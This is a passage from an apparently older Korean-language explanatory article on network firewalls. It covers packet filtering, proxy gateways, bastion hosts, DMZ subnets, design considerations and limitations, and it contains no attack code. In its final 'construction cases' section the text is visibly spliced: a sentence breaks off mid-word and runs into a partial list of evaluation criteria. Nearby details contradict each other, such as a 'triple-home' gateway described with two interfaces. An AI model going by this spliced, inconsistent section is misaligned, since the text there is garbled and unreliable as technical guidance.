알아내서 침입하는 것을 근본적으로 막아주게 된다.

    3)패킷 필터링
    IP 패킷 필터링(Packet Filtering)은 통상 라우터 인터페이스를 지나는 패킷을
필터링을 하기 위해 설계된 패킷 필터링 라우터(packet filtering router)를 사용하
여 행해진다. 패킷 필터링 라우터는 IP 패킷중  다음의 전부 또는 일부를 필터링
할 수 있다.
    - source IP address
    - destination IP address
    - TCP/IP source port
    - TCP/IP destination port

    모든 패킷 필터링 라우터가 소스 TCP/IP 포트를 필터링하지는 않는다. 그러
나 많은 제조회사들이 이러한 능력을 증가시키고 있다.  대부분은 아니지만 유닉
스 호스트도 패킷 필터링 기능을 제공한다.

    4)응용계층 게이트웨이(Application Level Gateway)
    응용계층서비스들은 중간전달(Store-and-Forward)방법을 쓰는  경우가 많은
데, 이는 게이트웨이에서 수행할 방법과 그대로 맞아떨어지게 된다. 게이트웨이는
송신자 응용서비스가 보내는 각종 정보를 그대로 전달하면 되는 것이다. 이 게이
트웨이에서는 보안을 위한 특별한 서비스가 제공된다.  예를 들어 내부와 외부간
의 모든 응용수준의 트래픽에 대해 로그기록이나, 텔네트(Telnet)나  FTP 등에서
사용자 인증을 할 경우 보다 우수한 방법을 사용한 변경된  인증방법을 이용한다
든가 하는 것이다. 이 응용계층의  게이트웨이 기능은 가상서버(Proxy Server)라
는 인터네트의 클라이언트/서버 개념에서 나온 서버 기능을 제공하게 된다. 예를
들어 외부의 전자우편클라이언트가 내부의 어떤 호스트내 전자우편  서버와 접속
맺기를 원한다면 중간에 가상서버가 이를  받아 다시 내부의 서버에게  전달하는
방식이 된다.

    5)스크린 라우터(Screen Router)
    어떤 기관이 인터네트에 접속할 경우 대부분 라우터(Router)를  거친다. 이는
인터네트 패킷을 전달하고 경로배정(Routing)을 담당하는 장비다. 라우터는  단순
장비가 아니라면 패킷의 헤더 내용을 보고  필터링(스크린)할 수 있는 능력을 가
지고 있다. 네트워크 수준의 IP(Internet Protocol) 데이터그램에서는 출발지 주소
및 목적지 주소에 의한 스크린,  TCP(Transmission Control Protocol) 수준의 패
킷에서는 네트워크응용을 판단케해주는 포트(Port) 번호에 의해  스크린,  프로토
콜별 스크린 등의 기능을 제공하게 된다.  이  스크린 라우터만을 가지고도 어느
정도 수준의 보안 접근제어를 통해 방화벽시스템 환경을 구현할 수 있다. 그러나
라우터에서 구현된 펌웨어의 수준으로는 제한점이 많고 복잡한  정책을 구현하기
어려우므로 보통 스크린 라우터와 다음에서 설명하는 베스쳔 호스트를 함께 운영
한다.

    6)베스쳔 호스트
    베스쳔 호스트(Bastion Hosts)는 방화벽시스템이 가지는  기능 중 가장 중요
한 기능을 제공하게 된다. 원래 베스쳔(Bastion)은 중세 성곽의 가장 중요한 수비
부분을 의미하는데,  방화벽시스템 관리자가 중점 관리하게될 시스템이  된다. 그
래서 방화벽시스템의 중요 기능으로 접근 제어 및 응용시스템 게이트웨이로서 가
상서버(Proxy Server)의 설치, 인증, 로그  등을 담당하게 된다. 그러므로 호스트
는 외부의 침입자가 주로  노리는 시스템이 된다. 따라서  일반 사용자의 게정을
만들지 않고 해킹의 대상이 될 어떠한 조건도 두지 않는 가장 완벽한 시스템으로
서 운영되어야 한다. 보통 판매되는 방화벽시스템은 이러한 베스쳔호스트를 제공
하는 것이라고 보면 된다.

    7)이중 네트워크 호스트(Dual-Homed Hosts)
    복수네트워크호스트는 2개 이상의 네트워크에 동시에 접속된  호스트를 말하
며 보통 게이트웨이 호스트라고 말하는 시스템이 된다. 2개의  네트워크, 즉 외부
네트워크와 내부 네트워크를 의미하고 외부 네트워크와 내부  네트워크간의 유일
한 패스를 제공하도록 조정된다. 즉 동적인 경로 배정과 경로 정보전달을 배제하
므로 모든 내.외부 트래픽은 이 호스트를  통과하도록 하여 베스쳔호스트의 기능
을 여기에 구현하면 되는 것이다.

    8)스크린 호스트 게이트웨이(Screen Host Gateway)
    스크린호스트게이트웨이 개념은 이 시스템을 내부 네트워크에 두어 스크린라
우터가 내부로 들어가는 모든 트래픽을 전부 스크린호스트에게만  전달되도록 하
겠다는 것이다. 또한 스크린라우터는 내부에서 외부로  가는 모든 트래픽에 대해
서도 스크린호스트에서 출발한  트래픽만 허용하고 나머지는  거부하게 된다. 그
래서 내부와 내부 네트워크사이의 경로는 '외부네트워크 - 스크린라우터  - 스크
린호스트 - 내부네트워크' 이외의 경로는 결코 허용하지 않게된다.  이 스크린호
스트도 결국 베스쳔호스트, 이중네 트워크호스트의 개념이 집합된 시스템이다.

    9)스크린 서브네트
    스크린 서브네트(Screen Subnet)는 일명 DMZ(DeMiliterization Zone)의 역할
을 외부 네트워크와 내부 네트워크 사이에 두겠다는 것으로 완충지역  개념의 서
브네트를 운영하는 것이다.  여기에 스크린 라우터를 이용하여 이 완충지역을 곧
장 통과 못하게 하지만 외부네트워크에서도 내부 네트워크에서도 이 스크린 서브
네트에 접근할 수는  있다. 어떤  기관에서 외부로  공개할 정보서버(Information
Server), 즉 익명 FTP서버,  고퍼(Gopher) 서버, 월드와이드웹(WWW)서버  등을
여기에 운영하면 된다.

    10)암호 장비
    암호장비(Encryption Devices)는 어떤 기관의 네트워크가 공공의 인터네트를
통해 여러 지역으로 분산되어 있을 경우 적당하다. 본사 네트워크가 방화벽 시스
템을 구축하였을 때 지역적으로 떨어진 지점 네트워크도 본사 네트워크처럼 보호
되어야하는 것이다. 이 경우 본사와 지점  네트워크 간이 인터네트로 연결되었다
면 안전을 보장하기 어려우므로 두 지점사이를 암호장비를 이용하여 가상 사설링
크(VPL, Virtual Private Link)로 만들어 운영하면 된다. 그러므로서 두개의 네트
워크는 하나의 안전한 네트워크로 만드는 것이다.  종단간 암호 방식은 데이터나
패스워드 등이 도청되는 것을 막는  방식을 원하는 사설백본(Private Backbone),
즉 여러 인터네트 접속점을 가진 기관에서 유용할 것이다.


5. 방화벽 시스템 구축하는 법
방화벽 시스템을 구축하려면 개념적으로  네트워크 레벨(Network Level) 방
화벽 시스템과 응용 레벨(Application Level) 방화벽 시스템으로 구분할 수  있다.
이러한 2가지 타입에 대해 어떤 것이 좋고 어떤 것이 나쁘다는 식의 판단을 내리
기는 어려운 점이 있지만 기관의 요구사항에 어떤 것이 부합되는지를  잘 판단하
는 것이 좋다.

    1)네트워크 레벨 방화벽
    네트워크 레벨의 시스템은 IP 패킷의  'Source/Destination' 어드레스와 포트
에 의해 결정하게 된다.  단순한 라우터는 낡은 방식의  네트워크 레벨 방화벽을
제공하는데, 이것은 어떤 패킷이 동작하는지 어떠한 네트워크에서 왔는지를 판단
해야 하는 복잡한 규칙에 대해 판단하기 어렵다. 현재의 네트워크 레벨 방화벽은
매우 복잡해져서 허용된 접속들의 상태와 어떤 종류의 데이터 내용  등을 관리할
수 있다.
    한가지 중요한 구별점은 네트워크 레벨  방화벽이 라우트를 직접 제어할  수
있으며, 할당된 IP 블럭을 정당하게 사용할 수 있도록 해준다는 점이다. 네트워크
레벨 방화벽은 매우 빠르며, 사용자에게 투명한 서비스를 보장한다.
    '스크린 호스트 방화벽' 이라고 할 수 있으며, 하나의 호스트에서의 접근제어
가 네트워크 레벨에서 동작하는 라우터에서 이루어지며, 이때의 하나의 호스트란
'Bastion Host'이다.
    또한, '스크린 서브네트 방화벽'이라는 것으로 구현될 수 있으며 이것은 네트
워크 레벨에서 동작하는 라우터가 하나의  전체 네트워크에 대한 접근제어를  할
수 있음을 말한다. 스크린호스트의 네트워크란 점만  빼면 스크린 호스트와 유사
한다.

    2)응용 레벨 방화벽
    응용 레벨 방화벽은 2개의 네트워크 간에  항상 직접적인 트래픽을 막고, 트
래픽에대해 로그, Audit 기능 등이  지원되는 프록시를 실행하는 기계를  말한다.
프록시 응용은 방화벽의 소프트웨어 부분이므로  많은 로그와 접근 제어  기능을
주는 것이 좋은 것이다. 응용레벨  방화벽은 어드레스 번역기로 사용될  수 있다.

어떤 쪽에서 들어와 다른 쪽으로 나가기 때문에 처음 시도한 접속에 대해 효과적
인 마스킹을 할 수 있는 것이다. 이렇게 중도에 응용을 가지는 것은 어떤 경우에
는 성능에 문제를 가질 수 있으며, 투명성이 보장되지 않는다. TIS 툴킷 등에 구
현된 것과 같은 초기  응용 레벨 방화벽은 일반  사용자에게 투명하지도 않으며,
어떤 연습이 필요하였다. 최근의 응용 레벨 방화벽은 투명성이 보장되며, 보다 상
세한 결산 보고와 네트워크 레벨 방화벽보다 보다 온전한 보안  모델을 제공하고
있다.
    '이중 네트워크 게이트웨이(Dual-Homed  Gateway)'가 있을  수 있다. 이는
프록시를 실행하는 고도의 보안이 제공되는  시스템. 2개의 네트워크 인터페이스
를 가지고 하나의 네트워크 인터페이스에 대해서는 모든 트래픽이 그냥 통과되는
것을 막는다.
    미래의 방화벽시스템은 네트워크 레벨과 응용 레벨 방화벽의  복합형이될 것
으로 예상된다. 이것의  의미는 네트워크레벨에서는 보다  상위의 기능을 가지려
하고 응용레벨에서는 보다 하위 기능을 가지려 하기 때문이다. 최종 결과는 아마
매우 빠른 패킷 스크린 기능과 모든 트래픽에  대한 로그와 심사 등이 예측되며,
특히 네트워크를 통해 전달되는 트래픽의 보호를 위해 암호 기법이 사용되리라고
보여진다.


6. 방화벽 시스템 구축시 고려 사항
우리는 실질적으로 방화벽  시스템에서 요구하는 대부분의 기능을 구현할수 있다.
방화벽 시스템의 가장 중요한 목적인 내부 네트워크의 보호라는 관점에서 다음의
고려 사항을 염두에 두고  방화벽의 설계 및 사양을 작성하거나, 구현 혹은 설치를
어떻게 할지를 판단하여야 한다.
    첫째, 가장 중요한 사항은 해당 업체의 조직이 어떻게 시스템을 운영할 것인
지에 대한 정책을 반영하는 것이다. 매우  중요한 네트워크에서의 작업을 제외하
고는 모든 접속을 거부하는 식의 시스템을 운영할 것인가 아니면 덜 위협적인 방
법으로 접속해 오는 모든 트래픽에  대해 조사하고 점검하는 방식으로  시스템을
운영할 것인가를 선택할 수 있다. 이러한 선택은 결정권에 대한 운영자의 태도에
달려있으며, 특히 엔지니어링 측면의 결정 보다 정책적인 결정에 따르게 된다.
    둘째, 어느 정도 수준의 모니터링과 백업 및 제어를 원하는가에 대한 문제다.
첫번째 사항으로 기관이 받아들일 수 있는 보안에 대한 위험 수준이 세워졌다면,
이제 어떤 것을 모니터하고, 허용하고, 거부할 것인가라는 체크리스트를 작성해야
한다. 즉, 기관의 전체적인 목적을 결정하고 위험평가에 근거한 필요성 분석을 하
며, 구현하고자 계획하여 사양을 마련했던 목록과 구별될 수 있는 문제점들을 가
려낸다.
    셋째, 경제적인 문제이다. 우리가 여기에서 정확하게 지적하기는 어렵지만 이
것을 구매하는데 드는 비용과 구현에 드는 비용을 정확하게 정량적으로 산출하고
자 하는 것이 중요하다. 예를 들어 완전한  방화벽제품의 구매에 드는 비용은 무
료에서 10만달러에 이를 수 있으며, 무료일 경우에는  시스코(Cisco) 라우터의 비
용과 구성 및 스태프의 인건비 등은 포함되지 않은 것이다. 제품 구매에 드는 비
용에는 월 3만달러의 인건비 등이 포함된다.  그리고 시스템 관리에 드는 오버헤
드 등이 포함된다. 방화벽 시스템의  우선 설치 및 구현에  드는 비용 뿐 아니라
지속적으로 드는 비용과 지원비 등이 계산되어야 한다.
    넷째, 기술적인 측면에서 몇가지 결정해야 할 것이 있는데, 기관 내부의 네트
워크와 네트워크 서비스 제공자 사이에서의  고정적 트래픽 라우팅 서비스  등에
대해서도 결정해야한다는 것이다. 트래픽 라우팅은 라우터에서의 IP 수준의 스크
린 규칙이나 혹은 프록시 게이트웨이나 서비스에서의 응용 수준 등에서 구현되어
야 한다.
    다섯째, telnet, ftp, news 등의 프록시를 설치한 외부 노출 기계를 외부 네트
워크에 둘 것인가 혹은 하나 이상의 내부 기계와 통신을  허용하는 필터링으로서
의 스크린 라우터를 만들 것인가를 결정해야 한다. 각각의 접근 방식은 장단점이
있는데, 프록시 기계가 고급 수준의 기록성과 잠재적인 보안 기능을 많이 구현해
야 하는 만큼 또한 비용이 많이 요구되기 때문이다. 프록시는 요구되는 서비스마
다 따로 설계되어야 하며, 편리성과 보안에 드는 비용은 상대적이다.
    현재 어떤 기업체가 인터네트에 연동할 때 가장 효과적인 보안  대책은 방화
벽(Firewall)을 설치하는 것이라고 알려져 있다.  하지만 방화벽의 상용제품은 하
드웨어 플랫폼, 컨설팅, 네트워크 재 설계 등으로 비용이 꽤 들어가는 것이다. 또
한 이러한 비용에 비추어서 고객이 바라는 완벽한 솔루션을 제공하는지도 의문이
있을 수 있다.
    방화벽이 100% 완전한 보안을 제공하는 것은 아니다. 방화벽은 단지 인터네
트 등의 전산망에서의 보안 격리만을 제공할 뿐이다. 따라서 방화벽 시스템을 가
동하고 있지만 어설픈 운영과 느슨한 정책 채택을 하고 있는 경우라면 더 심각한
문제를 일으키기도 한다.방화벽은 단순히 전산망의  기술적인 보안문제에 관심있
을 뿐이며, 그 밖에 호스트에서의 보안  문제, 보안 모니터링, 중앙집중적인 보안
관리, 정책, 교육 등이 총 망라되어야  할 것이다. 방화벽을 설치하고 집중적으로
보안을 담당할 인력을 보강하고 구체적인 대책과 관리에 신경을 쓴다면 비용효과
적인 대책을 수립할 수 있다.



7. 제기되는 문제들
파이어월의 기능은 갈수록 발전하고 있다. 이들 기능은  Telnet,FTP,MAIL,NFS
,X윈도 드으이 서비스에 접근할 수 있는 길을 통제할 수 있다. 이러한 통제는
사용자에게는 매우 불편함이 있다. 따라서 네트워크 보안 정책이 잘 구성돼야
보안에도 지장이 없고 사용자의 요구사항을 만족시킬 수 있다. 파이어월이 설
치된 시스템에 접근하기 위해서는 파이어월을 통과해야만 된다.  불법적인 침
입은 통제가 가능하다. 그러나 만일  파이어월 내부로 직접 연결하고자 할 경
우 파이어월이 어떻게 통제하느냐 하는 문제가 지금고 큰 이슈다.
예를 들어 파이어월로부터 보호되는 내부의 호스트가 외부로부터  모뎀접속을
지원받고자 할 경우  SLIP(Serial Line IP), PPP(Point to Point Protocol)로
접속을 시도할 것이며 이것은 근복적으로 파이어월 내부의 네트워크가 파이어
월이 어떤 형태로 지원해야 하는가가 문제다. 현재 일회용 패스워드 등  진보
된 승인기능(Authentication)과 암호화 기법을  이용해 문제를 해결하고 있으
며 일부 파이어월이 이러한 방식을 지원하고 있다.
파이어월은 내부의 침입자가 서버의 데이터를 테이프로 백업받아 외부로 유출
하는 경우에 대한 보안을 지원할수 없다. 외부 네트워크로부터 보안이 필요한
자료의 유출을 막기 위해 설계된 것이기 때문이다.
파이어월은 바이러스에 약하다. 파이어월에서 현재까지 바이러스에 감염된 파
일을 다운로드할 경우 또는 전자우편을 통해 감염될 경우 미리  점검할 수 있
는 방법이 없는 것이다.
모든 네트워크의 연결은 파이워월을 통과해야 하므로 파이월이 성능상 병목현
상을 초래할 수도 있다.
그만큼 큰 네트워에서는 적당하게 그룹핑해 파이월에 접속하는 것이 바람직하
다. 이밖에 클라이언트에서 데이터를 처리할 경우 즉데이터패킷에 클라이언트
가 실행할 수 있는 명령이 있는 경우 실행  명령중에 보안관련 파일을 변경할
수 있는 명령이 있을 수도 있다. 이 경우 현재는 진보된 사용자인증  프록시(
Proxy)기능으로 문제를 해결하고 있다.

8. 구축사례
파이어월의 구축 사례는 많다.  개념적 파이어월의 구축 형태는 패킷  필터링
파이어월 <>삼중 홈게이트웨이 파이어월 <>차폐된 호스트 파이어월등 3가지로
구분 할 수 있다.
패킷 필터링 파이어월은 라우터 단독으로 파이어월 기능을 하며 패킷  필터하
는 기능을 라우터에 구축하는 것을 말한다. 삼중 홈 게이트웨이 파이어월은
게이트웨이를 하는 호스트에 2개의 네트워크 인터페이스가 있으며 이들은 서
로 분리된 형태로 이션 게이트웨이 기능)하는 여부와 함께 외부에 공개
해야 할 서버와 내부에서만 사용하고 공개하지 않은 서버를 구분,서로 분리할
수 있는 것이어야 한다. 셋째 규칙을 정의하는 언어가 사용자에게 쉬어야 하며
 GUI화면으로 지원된 것이어야 한다. 넷째 파이어월의 일반 규정이 적용하지
않은 규칙은 거절해야 한다. 다섯째 파이어월이 네트워크에 있는 트래픽을
로깅해야 한다고 향후 네트워크 보안 정책 수립에 필요한 통계자료를 추출할
수 있어야 한다. 여섯째 파이어월이 보안된 오퍼레이팅 시스템으로 운영되고
있는가 여부와 TCP/IP상의 서비스들을 어느정도 지원하고 있는가 여부를 따져
야 한다. TCP,UDP,RCP를 기반으로 하는 응용시스템까지 지원할 수 있는가를 파악
해야 한다. 마지막으로 파이어월이 암호화된 기능을 지원하는가를 파악해야 한다.


==============================
